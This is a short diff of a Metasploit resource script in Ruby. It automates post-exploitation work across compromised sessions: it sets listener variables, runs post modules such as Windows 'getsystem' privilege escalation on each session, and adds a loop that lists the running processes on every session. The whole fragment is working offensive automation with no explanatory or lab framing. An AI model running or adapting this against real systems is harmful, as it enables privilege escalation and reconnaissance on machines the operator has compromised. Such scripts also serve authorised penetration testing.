@@ -23,12 +23,19 @@ posts = ["post/windows/escalate/getsystem",
 ### Sets global variables
 run_single("setg LHOST #{lhost}")
 run_single("setg LPORT #{lport}")
- 
+
+### For each post module, run on each session ### 
 posts.each do|d|
-        print_line("running #{d}")
+        print_status("Starting....oh, hello #{d}")
         run_single("use #{d}")
         run_single("resource /usr/share/metasploit-framework/scripts/resource/run_all_post.rc")
 end
        
- 
+framework.sessions.each do |num,session|
+	print_status("Running process enumeration against session #{num}")
+	session.sys.process.get_processes().each do |x|
+		print_status(" #{num} = Process: #{x['pid']} #{x['name']}")
+	end
+end
+
 </ruby>
